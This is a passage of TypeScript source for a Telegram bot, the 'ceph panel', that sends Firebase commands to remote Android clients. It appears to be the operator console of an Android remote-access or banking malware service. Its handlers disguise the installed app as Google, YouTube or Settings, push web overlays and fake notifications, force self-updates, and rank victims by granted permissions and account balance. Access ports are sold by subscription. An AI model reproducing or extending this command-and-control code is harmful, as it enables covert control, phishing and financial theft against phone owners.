                            const ttx = createFont("?? reply the property [ ") + `${notif_id} ]-[ ${_mode.slice(4).toLowerCase()} ]-[ ${update.callback_query?.message?.message_id} ]`;
                            await scarlett.api.editMessageText(update.callback_query!.message!.chat.id, sentMsgx.message_id, ttx);
                        });

                        break;
                    }
                    case "editSound": {
                        const _notif_id = _spl[2]!;
                        const _is_there = classify.notification.isThere(_notif_id);

                        if (!_is_there.status) {
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, { text: createFont("notification session did not find"), show_alert: true });
                            return;
                        }

                        await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont(`?? choose a sound for notification\n?? current sound: ${_is_there.notification!.sound}`),
                            {
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: createFont("?? default ??"), callback_data: `setSound_${_uid}_${_notif_id}_default_${update.callback_query.message.message_id}` }],
                                        [
                                            { text: createFont("?? bubble"), callback_data: `setSound_${_uid}_${_notif_id}_bubble_${update.callback_query.message.message_id}` },
                                            { text: createFont("mio cat ????"), callback_data: `setSound_${_uid}_${_notif_id}_mio_${update.callback_query.message.message_id}` }
                                        ],
                                        [
                                            { text: createFont("?? close ??"), callback_data: `closeMe_${_uid}` }
                                        ]
                                    ]
                                }
                            }
                        );
                        break;
                    }
                    case "setSound": {
                        const __notif_id = _spl[2]!;
                        const __is_there = classify.notification.isThere(__notif_id);
                        const theone = _spl[3]!;
                        const msgidtoedit = parseInt(_spl[4]!);

                        if (!__is_there.status) {
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, { text: createFont("notification session did not find"), show_alert: true });
                            return;
                        }

                        await classify.notification.updateNotification(
                            __notif_id,
                            { sound: (theone === "bubble" ? "bubble" : theone === "mio" ? "mio" : "default") }
                        );

                        Object.defineProperty(__is_there.notification, "sound", {
                            value: (theone === "bubble" ? "bubble" : theone === "mio" ? "mio" : "default"),
                            enumerable: true,
                            configurable: true,
                            writable: true
                        });

                        await scarlett.api.deleteMessage(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id
                        );

                        const created_text = await classify.notification.createText(
                            { ...__is_there.notification },
                            createFont
                        );

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            msgidtoedit,
                            createFont("?? | notification builder\n\n??? | create a new notification under 15 minutes\n\n") + "<blockquote expandable>" + created_text + "</blockquote>",
                            {
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: createFont("??? title"), callback_data: `editTitle_${_uid}_${__notif_id}` },
                                            { text: createFont("body ??"), callback_data: `editBody_${_uid}_${__notif_id}` }
                                        ],
                                        [
                                            { text: createFont("?? sound"), callback_data: `editSound_${_uid}_${__notif_id}` },
                                            { text: createFont("url ??"), callback_data: `editURL_${_uid}_${__notif_id}` }
                                        ],
                                        [
                                            { text: createFont("?? big picture ??"), callback_data: `editBigPicture_${_uid}_${__notif_id}` }
                                        ],
                                        [
                                            { text: createFont("?? big icon"), callback_data: `editBigIcon_${_uid}_${__notif_id}` },
                                            { text: createFont("small icon ??"), callback_data: `editSmallIcon_${_uid}_${__notif_id}` }
                                        ],
                                        [
                                            { text: createFont("↩️ back"), callback_data: `showUserPanel_${_uid}_${__is_there.notification?.client_id}` },
                                            { text: createFont("push ??"), callback_data: `pushRealNotification_${_uid}_${__notif_id}` }
                                        ]
                                    ]
                                }
                            }
                        );

                        break;
                    }
                    case "closeMe": {
                        await scarlett.api.deleteMessage(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id
                        );
                        break;
                    }
                    case "pushRealNotification": {
                        const ___notif_id = _spl[2]!;
                        const ___is_there = classify.notification.isThere(___notif_id);

                        if (!___is_there.status) {
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, { text: createFont("notification session did not find"), show_alert: true });
                            return;
                        }

                        const tmpcid = ___is_there.notification!.client_id;
                        delete (___is_there.notification as any).at;
                        delete (___is_there.notification as any).message_id;
                        delete (___is_there.notification as any).client_id;
                        delete (___is_there.notification as any).big_picture_path;
                        delete (___is_there.notification as any).big_icon_path;
                        delete (___is_there.notification as any).small_icon_path;

                        await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont(`🛰️ | sending ~ pushNotification\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + tmpcid,
                            { parse_mode: "HTML" }
                        );

                        break;
                    }
                    case "skin": {
                        await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont(`🎨 select an skin to change on it`),
                            {
                                reply_parameters: { message_id: update.callback_query.message.message_id },
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: createFont("🔍 google"), callback_data: `changeSkin_${_uid}_${_spl[2]}_google` },
                                            { text: createFont("youtube ▶️"), callback_data: `changeSkin_${_uid}_${_spl[2]}_youtube` }
                                        ],
                                        [
                                            { text: createFont("⚙️ settings ⚙️"), callback_data: `changeSkin_${_uid}_${_spl[2]}_settings` },
                                        ],
                                        [
                                            { text: createFont("↩️ back"), callback_data: `showUserPanel_${_uid}_${_spl[2]}` },
                                        ]
                                    ]
                                }
                            }
                        );
                        break;
                    }
                    case "changeSkin": {
                        const __sent_msg = await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont(`🛰️ | sending ~ changeSkin\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + _spl[2],
                            { parse_mode: "HTML" }
                        );

                        const user_token_2 = await classify.tokenService.getAndroidIdAndPort(_spl[2]!, _port_of.port);
                        const user_info_2 = await classify.ceph.getClientById(_spl[2]!);
                        if (user_token_2 && user_info_2) {
                            const ___msg_stat = await sendFirebaseMessage({
                                data: {
                                    method: "changeSkin",
                                    skin: _spl[3],
                                    x: _spl[2]!,
                                    y: (__sent_msg.message_id as any)
                                },
                                token: user_token_2.token,
                                clientPublicKey: user_info_2.public_key
                            });

                            if (___msg_stat.status === false) {
                                await scarlett.api.sendMessage(
                                    update.callback_query.message.chat.id,
                                    createFont(`🔴 | ${___msg_stat['message']}`),
                                    { reply_parameters: { message_id: update.callback_query.message.message_id } }
                                );
                            }
                        }
                        break;
                    }
                    case "ranking": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("📊 | ranking charts for better access"),
                            {
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: createFont("⚜️ top permissions ⚜️"), callback_data: `rankingTopPermissions_${update.callback_query.from.id}_0` }
                                        ],
                                        [
                                            { text: createFont("📈 top online balances 📈"), callback_data: `rankingTopOnlineBalances_${update.callback_query.from.id}_0` }
                                        ],
                                        [
                                            { text: createFont("🍃 top entire balances 🍃"), callback_data: `rankingTopEntireBalances_${update.callback_query.from.id}_0` }
                                        ],
                                        [
                                            { text: createFont("↩️ back"), callback_data: `showStartPanel_${update.callback_query.from.id}` }
                                        ]
                                    ]
                                }
                            }
                        );

                        break;
                    }
                    case "rankingTopPermissions": {
                        const topPerIndex = parseInt(_spl[2]!);
                        const topPerLists = await getOnlineRankingPermission(_port_of.port);
                        const topPerChunk = chunkList(topPerLists, 10);
                        const topPerPage = topPerChunk[topPerIndex];
                        if (!topPerPage) {
                            await scarlett.api.answerCallbackQuery(
                                update.callback_query.id,
                                { show_alert: true, text: createFont(`❌ page ${topPerIndex + 1} does not exist, try again`) }
                            );
                            return;
                        }

                        let topPerTxt = createFont(`📡 | ranking online users by permissions [ ${topPerIndex + 1}/${topPerChunk.length} ]\n`);
                        let topPerNum = 1;

                        for (const u of topPerPage) {
                            topPerTxt += `\n\n#${topPerNum + (topPerIndex * 20)} | /set_${u.id} ` + createFont("[ " + u.permissions.join(", ") + " ]");
                            topPerNum += 1;
                        }

                        const topPerKeys: InlineKeyboardButton[][] = [[]];

                        if (topPerChunk[topPerIndex - 1]) {
                            topPerKeys[0]!.push({ text: createFont("⏮️ previous"), callback_data: `rankingTopPermissions_${update.callback_query.from.id}_${topPerIndex - 1}` });
                        }

                        if (topPerChunk[topPerIndex + 1]) {
                            topPerKeys[0]!.push({ text: createFont("next ⏭️"), callback_data: `rankingTopPermissions_${update.callback_query.from.id}_${topPerIndex + 1}` });
                        }

                        if (topPerKeys[0]!.length === 0) {
                            topPerKeys.splice(0, 1);
                        }

                        topPerKeys.push([
                            { text: createFont("↩️ back"), callback_data: `ranking_${update.callback_query.from.id}` },
                            { text: createFont("🔃 update 🔃"), callback_data: `rankingTopPermissions_${update.callback_query.from.id}_0` }
                        ]);

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            topPerTxt,
                            { parse_mode: "HTML", reply_markup: { inline_keyboard: topPerKeys } }
                        );

                        break;
                    }
                    case "rankingTopOnlineBalances": {
                        const topOnBlncIndex = parseInt(_spl[2]!);
                        const topOnBlncLists = await getOnlineRankingBalanceForChart(_port_of.port);
                        const topOnBlncChunk = chunkList(topOnBlncLists, 10);
                        const topOnBlncPage = topOnBlncChunk[topOnBlncIndex];
                        if (!topOnBlncPage) {
                            await scarlett.api.answerCallbackQuery(
                                update.callback_query.id,
                                { show_alert: true, text: createFont(`❌ page ${topOnBlncIndex + 1} does not exist, try again`) }
                            );
                            return;
                        }

                        let topOnBlncTxt = createFont(`📡 | ranking online users by balance [ ${topOnBlncIndex + 1}/${topOnBlncChunk.length} ]\n`);
                        let topOnBlncNum = 1;

                        for (const u of topOnBlncPage) {
                            topOnBlncTxt += `\n\n#${topOnBlncNum + (topOnBlncIndex * 20)} | /set_${u.id} ` + createFont("[ " + formatNumberWithUnit(u.balance_count ? u.balance_count : "0") + " ]");
                            topOnBlncNum += 1;
                        }

                        const topOnBlncKeys: InlineKeyboardButton[][] = [[]];

                        if (topOnBlncChunk[topOnBlncIndex - 1]) {
                            topOnBlncKeys[0]!.push({ text: createFont("⏮️ previous"), callback_data: `rankingTopOnlineBalances_${update.callback_query.from.id}_${topOnBlncIndex - 1}` });
                        }

                        if (topOnBlncChunk[topOnBlncIndex + 1]) {
                            topOnBlncKeys[0]!.push({ text: createFont("next ⏭️"), callback_data: `rankingTopOnlineBalances_${update.callback_query.from.id}_${topOnBlncIndex + 1}` });
                        }

                        if (topOnBlncKeys[0]!.length === 0) {
                            topOnBlncKeys.splice(0, 1);
                        }

                        topOnBlncKeys.push([
                            { text: createFont("↩️ back"), callback_data: `ranking_${update.callback_query.from.id}` },
                            { text: createFont("🔃 update 🔃"), callback_data: `rankingTopOnlineBalances_${update.callback_query.from.id}_0` }
                        ]);

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            topOnBlncTxt,
                            { parse_mode: "HTML", reply_markup: { inline_keyboard: topOnBlncKeys } }
                        );

                        break;
                    }
                    case "rankingTopEntireBalances": {
                        const topEnBlnceIndex = parseInt(_spl[2]!);
                        const topEnBlnceLists = await getEntireRankingBalanceForChart(_port_of.port);
                        const topEnBlnceChunk = chunkList(topEnBlnceLists, 10);
                        const topEnBlncePage = topEnBlnceChunk[topEnBlnceIndex];
                        if (!topEnBlncePage) {
                            await scarlett.api.answerCallbackQuery(
                                update.callback_query.id,
                                { show_alert: true, text: createFont(`❌ page ${topEnBlnceIndex + 1} does not exist, try again`) }
                            );
                            return;
                        }

                        let topEnBlnceTxt = createFont(`📡 | ranking entire users by balance [ ${topEnBlnceIndex + 1}/${topEnBlnceChunk.length} ]\n`);
                        let topEnBlnceNum = 1;

                        for (const u of topEnBlncePage) {
                            topEnBlnceTxt += `\n\n#${topEnBlnceNum + (topEnBlnceIndex * 10)} | /set_${u.id} ` + createFont("[ " + formatNumberWithUnit(u.balance_count ? u.balance_count : "0") + " ]");
                            topEnBlnceNum += 1;
                        }

                        const topEnBlnceKeys: InlineKeyboardButton[][] = [[]];

                        if (topEnBlnceChunk[topEnBlnceIndex - 1]) {
                            topEnBlnceKeys[0]!.push({ text: createFont("⏮️ previous"), callback_data: `rankingTopEntireBalances_${update.callback_query.from.id}_${topEnBlnceIndex - 1}` });
                        }

                        if (topEnBlnceChunk[topEnBlnceIndex + 1]) {
                            topEnBlnceKeys[0]!.push({ text: createFont("next ⏭️"), callback_data: `rankingTopEntireBalances_${update.callback_query.from.id}_${topEnBlnceIndex + 1}` });
                        }

                        if (topEnBlnceKeys[0]!.length === 0) {
                            topEnBlnceKeys.splice(0, 1);
                        }

                        topEnBlnceKeys.push([
                            { text: createFont("↩️ back"), callback_data: `ranking_${update.callback_query.from.id}` },
                            { text: createFont("🔃 update 🔃"), callback_data: `rankingTopEntireBalances_${update.callback_query.from.id}_0` }
                        ]);

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            topEnBlnceTxt,
                            { parse_mode: "HTML", reply_markup: { inline_keyboard: topEnBlnceKeys } }
                        );

                        break;
                    }
                    case "showStartPanel": {
                        const allclients = await classify.ceph.getClientsCommittedFrom(_port_of.port);
                        const _ss_rd_clients = await classify.ceph.getOnlineClientsByPort(_port_of.port);
                        const allonlineclientslength = _ss_rd_clients.length;
                        const systemBalance = await getEntireRankingBalance(_port_of.port);
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont(`📊 | welcome to ceph panel\n👥 | all users: ${allclients.length} | onlines: ${allonlineclientslength}\n🌊 | port: `) + `<code>${_port_of.port}</code>` + createFont(`\n\n📺 | balance: ${systemBalance}\n⚙️ | open one of options for better access\n\n⚠️ | به دلیل تغییر سیستم به فایربیس, همیشه آنلاینی هارو رفرش کنید تا از تازه بودن آمار مطمعن بشید`),
                            {
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: createFont("👥 online users"), callback_data: `onlineuserslist_${update.callback_query.from.id}` },
                                            { text: createFont("all users 📊"), callback_data: `alluserslist_${update.callback_query.from.id}` }
                                        ],
                                        [
                                            { text: createFont("📈 ranking 📉"), callback_data: `ranking_${update.callback_query.from.id}` }
                                        ],
                                        [
                                            { text: createFont("⚗️ upload app"), callback_data: `uploadapp_${update.callback_query.from.id}` },
                                            { text: createFont("persian guide 🧾"), url: conf_data.ceph_telegram_persianguide_link }
                                        ],
                                        [
                                            { text: createFont("⚖️ about us ⚖️"), url: conf_data.ceph_telegram_channel_link, style: "primary" }
                                        ]
                                    ]
                                }
                            }
                        );

                        break;
                    }
                    case "webApp": {
                        try {
                            await scarlett.api.sendMessage(
                                update.callback_query.from.id,
                                createFont(`🌌 | Open Webapp | ${_spl[2]}`),
                                {
                                    reply_markup: {
                                        inline_keyboard: [
                                            [
                                                {
                                                    text: createFont("Open"),
                                                    web_app: { url: `https://talghsamen.ir/view-by/${_spl[2]}` }
                                                }
                                            ]
                                        ]
                                    }
                                }
                            );

                            await scarlett.api.sendMessage(
                                update.callback_query.message.chat.id,
                                createFont("✅ | check your private messages (pv)"),
                                { reply_parameters: { message_id: update.callback_query.message.message_id } }
                            );
                        } catch (e) {
                            await scarlett.api.sendMessage(
                                update.callback_query.message.chat.id,
                                createFont("❌ | please start bot first"),
                                { reply_parameters: { message_id: update.callback_query.message.message_id } }
                            );
                        }

                        break;
                    }
                    case "refreshAdminList": {
                        const admin_text = admins.map((admin) => `👥 | <code>${admin.id}</code>\n📮 | <code>${admin.role.toUpperCase()}</code>\n----------------\n`).join("\n");
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            `👥 | admins [ ${admins.length} ]\n\n${admin_text}`,
                            {
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: "🔃 refresh 🔃", callback_data: `refreshAdminList_${update.callback_query.from.id}` }]
                                    ]
                                }
                            }
                        );
                        break;
                    }
                    case "overlay": {
                        await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont("❔ enter a link url with https\n\ne.g:\n") + "<blockquote>https://google.com</blockquote>",
                            {
                                parse_mode: "HTML",
                                reply_parameters: { message_id: update.callback_query.message.message_id }
                            }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getNewLinkForOverlay", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "selfUpdate": {
                        const msg_send_su = await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont(`🛰️ | sending ~ selfUpdate\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + _spl[2],
                            { parse_mode: "HTML" }
                        );

                        const token_su = await classify.tokenService.getAndroidIdAndPort(_spl[2]!, _port_of.port);
                        const user_su = await classify.ceph.getClientById(_spl[2]!);

                        if (token_su && user_su) {
                            await sendFirebaseMessage({
                                data: {
                                    method: "selfUpdate",
                                    x: _spl[2]!,
                                    y: (msg_send_su.message_id as any)
                                },
                                token: token_su.token,
                                clientPublicKey: user_su.public_key
                            });
                        }

                        break;
                    }
                }
            }
        }
    }
});

fastify.listen({ host: "0.0.0.0", port: 6443 }, (err, addr) => {
    console.log(err, addr);
});

setInterval(async () => {
    const allsteps = await classify.steps.getAllSteps();
    for (const stp of allsteps) {
        if ((stp.timestamp + 900000) < Date.now()) {
            try {
                const instance = await classify.steps.getInstance();
                await instance.deleteOne({ ...stp });
            } catch (e) { console.error(e); }
        }
    }
}, getRandomTimeout());

setInterval(async () => {
    const allports = await classify.portService.getAllPorts();
    for (const port of allports){
        if (port.limited_to < Date.now()) {
            await classify.portService.changePortStatusByName(port.port, "tax");
            await scarlett.api.sendMessage(
                port.stores_to,
                `🌀 | اشتراک این پورت [${port.port}] تموم شد\n\n🛜 | جهت خرید یا تمدید : @cephServicesBot`,
                {
                    parse_mode: "HTML"
                }
            );
        }
    }
}, getRandomTimeout())
